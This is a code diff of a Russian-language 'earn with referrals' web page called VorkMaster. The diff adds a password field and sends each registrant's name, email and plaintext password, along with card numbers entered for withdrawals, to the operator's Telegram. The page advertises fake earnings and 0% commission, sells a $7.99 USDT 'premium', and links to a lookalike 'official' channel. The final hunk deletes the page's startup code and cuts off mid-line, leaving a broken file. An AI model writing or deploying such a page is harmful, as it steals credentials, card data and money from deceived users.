@@ -7,7 +7,7 @@
     <style>
         * {
             margin: 0;
-            padding: 0;
+            padding:   ;
             box-sizing: border-box;
         }
 
@@ -55,7 +55,6 @@
             margin-bottom: 30px;
         }
 
-        /* Кнопка Google */
         .google-btn {
             background: white;
             color: #1e293b;
@@ -79,7 +78,6 @@
             transform: scale(0.97);
         }
 
-        /* Карточки */
         .cards {
             display: flex;
             flex-direction: column;
@@ -121,7 +119,6 @@
             background: linear-gradient(135deg, #1e1b3a, #0f172a);
         }
 
-        /* Модальное окно регистрации */
         .overlay {
             display: none;
             position: fixed;
@@ -180,7 +177,6 @@
             margin-top: 10px;
         }
 
-        /* Личный кабинет */
         .dashboard {
             display: none;
         }
@@ -248,6 +244,31 @@
             margin: 15px 0;
         }
 
+        .task-item {
+            background: #0f172a;
+            border-radius: 16px;
+            padding: 12px;
+            margin: 10px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .task-btn {
+            background: #8b5cf6;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 40px;
+            color: white;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+
+        .task-done {
+            background: #10b981;
+            opacity: 0.7;
+        }
+
         footer {
             text-align: center;
             color: #475569;
@@ -286,7 +307,7 @@
                 <ul>
                     <li>✅ За друга → 1000₽</li>
                     <li>💰 Вывод от 30 000₽</li>
-                    <li>⚡ Комиссия: 25%</li>
+                    <li>⚡ Комиссия: 0%</li>
                 </ul>
             </div>
             <div class="card premium">
@@ -294,8 +315,9 @@
                 <div class="price">до 200 000₽/мес</div>
                 <ul>
                     <li>✅ За первых 3 друзей → 4000₽</li>
+                    <li>✅ За 7 друзей → +5000₽ бонус</li>
                     <li>💰 Вывод от 70 000₽</li>
-                    <li>⚡ Комиссия: 20%</li>
+                    <li>⚡ Комиссия: 0%</li>
                 </ul>
                 <div style="color:#facc15; margin-top:10px;">$7.99 USDT</div>
             </div>
@@ -312,6 +334,10 @@
             <div class="stat-row">
                 <span>👤 Имя:</span>
                 <span id="userName">—</span>
+            </div>
+            <div class="stat-row">
+                <span>📧 Email:</span>
+                <span id="userEmail">—</span>
             </div>
             <div class="stat-row">
                 <span>💰 Баланс:</span>
@@ -332,38 +358,48 @@
             </div>
         </div>
 
+        <!-- ЗАДАНИЯ -->
         <div class="method-block">
-            <h3>🔥 КАК ЗАРАБАТЫВАТЬ?</h3>
-            <p>1️⃣ Скопируй ссылку и отправляй друзьям</p>
-            <p>2️⃣ За друга → бонус на баланс</p>
-            <p>3️⃣ Выполняй задания: <a href="https://t.me/vorkmaster_tasks" style="color:#c084fc;">@vorkmaster_tasks</a></p>
-            <p>4️⃣ Накопи сумму → выведи на карту</p>
+            <h3>📋 ВЫПОЛНИ ЗАДАНИЯ</h3>
+            
+            <div class="task-item" id="taskSubscribe">
+                <span>📢 Подписаться на канал</span>
+                <button class="task-btn" id="subscribeBtn">Выполнить</button>
+            </div>
+            
+            <div class="task-item" id="taskFriends">
+                <span>👥 Пригласить 7 друзей → +5000₽</span>
+                <span id="friendsProgress">0/7</span>
+            </div>
         </div>
 
         <div class="method-block" id="premiumBlock" style="display:none;">
             <h3>🚀 ПРЕМИУМ МЕТОД</h3>
             <p>✅ За первых 3 друзей → 4000₽</p>
-            <p>✅ Комиссия вывода: 20%</p>
+            <p>✅ За 7 друзей → +5000₽ бонус</p>
+            <p>✅ Эксклюзивные задания</p>
+            <p>✅ Комиссия вывода: 0%</p>
         </div>
 
         <div class="profile-card">
-            <h3>💸 ВЫВОД</h3>
+            <h3>💸 ВЫВОД СРЕДСТВ</h3>
             <div id="withdrawInfo"></div>
             <button class="withdraw-btn" id="withdrawBtn">💳 ЗАПРОСИТЬ ВЫВОД</button>
         </div>
 
         <button class="withdraw-btn" id="buyPremiumBtn" style="background:#facc15;">💎 КУПИТЬ ПРЕМИУМ — $7.99</button>
         
-        <footer>VorkMaster</footer>
+        <footer>VorkMaster — зарабатывай с друзьями</footer>
     </div>
 </div>
 
-<!-- ФОРМА РЕГИСТРАЦИИ (всплывающее окно) -->
+<!-- ФОРМА РЕГИСТРАЦИИ (Имя, Email, Пароль) -->
 <div id="regForm" class="overlay">
     <div class="reg-form">
-        <h2>🔐 Вход через Google</h2>
+        <h2>🔐 РЕГИСТРАЦИЯ</h2>
         <input type="text" id="regName" placeholder="Имя и фамилия">
         <input type="email" id="regEmail" placeholder="Email">
+        <input type="password" id="regPassword" placeholder="Пароль">
         <button id="submitReg">✅ ЗАРЕГИСТРИРОВАТЬСЯ</button>
         <button id="closeReg" class="close-btn">Закрыть</button>
     </div>
@@ -415,28 +451,52 @@
     function updateUI() {
         if (!user) return;
         document.getElementById("userName").innerText = user.name;
+        document.getElementById("userEmail").innerText = user.email;
         document.getElementById("balance").innerText = user.balance + " ₽";
         document.getElementById("referralCount").innerText = user.refs.length;
         
+        // Прогресс друзей
+        let friendsCount = user.refs.length;
+        document.getElementById("friendsProgress").innerText = friendsCount + "/7";
+        
         if (user.premium) {
-            document.getElementById("premiumStatus").innerHTML = "✅ Да (20%)";
+            document.getElementById("premiumStatus").innerHTML = "✅ Да";
             document.getElementById("premiumBlock").style.display = "block";
         } else {
-            document.getElementById("premiumStatus").innerHTML = "❌ Нет (25%)";
+            document.getElementById("premiumStatus").innerHTML = "❌ Нет";
             document.getElementById("premiumBlock").style.display = "none";
         }
         
+        // Проверка бонуса за 7 друзей (только для премиум)
+        if (user.premium && user.sevenFriendsBonus === false && user.refs.length >= 7) {
+            user.balance += 5000;
+            user.sevenFriendsBonus = true;
+            saveUser(user);
+            sendToTG(`🎁 БОНУС 5000₽!\n👤 ${user.name}\n👥 Пригласил 7 друзей\n💰 Баланс: ${user.balance}₽`);
+            alert("🎉 ПОЗДРАВЛЯЮ! Ты пригласил 7 друзей и получил +5000₽ на баланс!");
+        }
+        
+        // Информация о выводе (без комиссии)
         let minOut = user.premium ? 70000 : 30000;
-        let com = user.premium ? 20 : 25;
         document.getElementById("withdrawInfo").innerHTML = `
-            <p>Мин. вывод: ${minOut} ₽</p>
-            <p>Комиссия: ${com}%</p>
-            <p>Баланс: ${user.balance} ₽</p>
-            ${user.balance >= minOut ? '<p style="color:#10b981;">✅ Можно вывести</p>' : '<p style="color:#facc15;">⚠️ Копи сумму</p>'}
+            <p>💰 Мин. вывод: ${minOut} ₽</p>
+            <p>⚡ Комиссия: 0%</p>
+            <p>📊 Баланс: ${user.balance} ₽</p>
+            ${user.balance >= minOut ? '<p style="color:#10b981;">✅ Можно вывести</p>' : '<p style="color:#facc15;">⚠️ Накопи сумму</p>'}
         `;
         
         let link = document.getElementById("refLink");
         if (link) link.value = window.location.href.split("?")[0] + "?ref=" + user.id;
+        
+        // Проверка выполнения подписки
+        if (user.subscribed) {
+            let subBtn = document.getElementById("subscribeBtn");
+            if (subBtn) {
+                subBtn.innerText = "✅ Выполнено";
+                subBtn.classList.add("task-done");
+                subBtn.disabled = true;
+            }
+        }
     }
     
     function addReferralBonus(refId, newId) {
@@ -461,14 +521,14 @@
             updateUI();
         }
         
-        sendToTG(`👥 НОВЫЙ РЕФЕРАЛ!\n👤 ${ref.name}\n🎁 Бонус: ${bonus}₽`);
+        sendToTG(`👥 НОВЫЙ РЕФЕРАЛ!\n👤 ${ref.name}\n🎁 Бонус: ${bonus}₽\n👥 Всего друзей: ${ref.refs.length}`);
     }
     
-    function register(name, email, refId) {
+    function register(name, email, password, refId) {
         let id = "id_" + Date.now() + "_" + Math.random().toString(36).substr(2, 4);
         let newUser = {
-            id: id, name: name, email: email, balance: 0, refs: [],
-            premium: false, premiumCount: 0
+            id: id, name: name, email: email, password: password, balance: 0, refs: [],
+            premium: false, premiumCount: 0, subscribed: false, sevenFriendsBonus: false
         };
         
         let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
@@ -482,7 +542,7 @@
         user = newUser;
         saveUser(user);
         
-        sendToTG(`🆕 РЕГИСТРАЦИЯ!\n👤 ${name}\n📧 ${email}\n🆔 ${id}\n${refId ? "🔗 Реферал: " + refId : "Прямая"}`);
+        sendToTG(`🆕 НОВАЯ РЕГИСТРАЦИЯ!\n👤 Имя: ${name}\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🆔 ID: ${id}\n${refId ? "🔗 Реферал: " + refId : "Прямая регистрация"}`);
         
         document.getElementById("mainScreen").style.display = "none";
         document.getElementById("dashboard").style.display = "block";
@@ -499,33 +559,53 @@
         localStorage.setItem("vork_all", JSON.stringify(all));
         
         updateUI();
-        alert("🔥 ПРЕМИУМ АКТИВИРОВАН!");
+        sendToTG(`💎 ПРЕМИУМ АКТИВИРОВАН!\n👤 ${user.name}\n📧 ${user.email}`);
+        alert("🔥 ПРЕМИУМ АКТИВИРОВАН! Теперь ты получаешь +4000₽ за первых 3 друзей и +5000₽ за 7 друзей!");
     }
     
     function withdraw() {
         if (!user) return;
         let minOut = user.premium ? 70000 : 30000;
-        let com = user.premium ? 20 : 25;
         if (user.balance < minOut) {
-            alert(`Нужно накопить ${minOut} ₽`);
+            alert(`❌ Нужно накопить ${minOut} ₽ для вывода`);
             return;
         }
-        let amount = user.balance * (1 - com/100);
-        let card = prompt("Номер карты:");
+        let amount = user.balance;
+        let card = prompt("💳 Введи номер карты для вывода:");
         if (!card || card.length < 10) return;
-        if (confirm(`Вывести ${amount.toFixed(0)} ₽?`)) {
-            sendToTG(`💸 ВЫВОД!\n👤 ${user.name}\n💰 ${amount.toFixed(0)} ₽\n💳 ${card}`);
+        if (confirm(`💰 Сумма вывода: ${amount} ₽\n⚡ Комиссия: 0%\n💳 Карта: ${card}\n\nВывести?`)) {
+            sendToTG(`💸 ЗАПРОС НА ВЫВОД!\n👤 ${user.name}\n📧 ${user.email}\n💰 Сумма: ${amount} ₽\n💳 Карта: ${card}\n🏆 Премиум: ${user.premium ? "Да" : "Нет"}`);
             user.balance = 0;
             saveUser(user);
             updateUI();
-            alert("Заявка отправлена!");
+            alert("✅ Заявка отправлена! Средства поступят в течение 24-72 часов.");
         }
+    }
+    
+    // Подписка на канал
+    function subscribeToChannel() {
+        if (!user) return;
+        if (user.subscribed) {
+            alert("✅ Ты уже подписан!");
+            return;
+        }
+        window.open("https://t.me/tonairdropofficiaI", "_blank");
+        setTimeout(() => {
+            let confirmSub = confirm("📢 Ты подписался на канал? Нажми ОК, чтобы получить доступ к заданиям.");
+            if (confirmSub) {
+                user.subscribed = true;
+                saveUser(user);
+                updateUI();
+                sendToTG(`📢 ПОДПИСКА НА КАНАЛ!\n👤 ${user.name}\n📧 ${user.email}\n✅ Подписался на @tonairdropofficiaI`);
+                alert("✅ Спасибо за подписку! Теперь ты можешь приглашать друзей и зарабатывать!");
+            }
+        }, 3000);
     }
     
     window.copyRefLink = function() {
         let link = document.getElementById("refLink").value;
         navigator.clipboard.writeText(link);
-        alert("Ссылка скопирована!");
+        alert("🔗 Реферальная ссылка скопирована!");
     };
     
     // ЗАПУСК
@@ -534,61 +614,4 @@
         if (urlRef) localStorage.setItem("pending_ref", urlRef);
         
         if (loadUser()) {
-            document.getElementById("mainScreen").style.display = "none";
-            document.getElementById("dashboard").style.display = "block";
-            updateUI();
-        }
-        
-        // Кнопка открывает форму
-        document.getElementById("openRegBtn").onclick = () => {
-            document.getElementById("regForm").style.display = "flex";
-        };
-        
-        document.getElementById("closeReg").onclick = () => {
-            document.getElementById("regForm").style.display = "none";
-        };
-        
-        document.getElementById("submitReg").onclick = () => {
-            let name = document.getElementById("regName").value.trim();
-            let email = document.getElementById("regEmail").value.trim();
-            if (!name) { alert("Введи имя"); return; }
-            if (!email || !email.includes("@")) { alert("Введи email"); return; }
-            let ref = localStorage.getItem("pending_ref");
-            register(name, email, ref);
-            localStorage.removeItem("pending_ref");
-            document.getElementById("regForm").style.display = "none";
-        };
-        
-        document.getElementById("buyPremiumBtn").onclick = () => {
-            if (user && user.premium) { alert("Премиум уже есть"); return; }
-            document.getElementById("cryptoForm").style.display = "flex";
-        };
-        
-        document.getElementById("copyAddrBtn").onclick = () => {
-            navigator.clipboard.writeText(WALLET);
-            alert("Адрес скопирован!");
-        };
-        
-        document.getElementById("confirmPayBtn").onclick = () => {
-            let txid = prompt("Введи TxID:");
-            if (txid && txid.length > 5) {
-                sendToTG(`💎 ПОКУПКА PREMIUM!\n👤 ${user ? user.name : "Гость"}\n💰 $7.99 USDT\n🆔 TxID: ${txid}`);
-                if (user) activatePremium();
-                document.getElementById("cryptoForm").style.display = "none";
-                alert("Премиум активирован!");
-            } else {
-                alert("Введи TxID");
-            }
-        };
-        
-        document.getElementById("closeCrypto").onclick = () => {
-            document.getElementById("cryptoForm").style.display = "none";
-        };
-        
-        document.getElementById("withdrawBtn").onclick = withdraw;
-    }
-    
-    start();
-</script>
-</body>
-</html>
+            document.getElementById("mainScreen
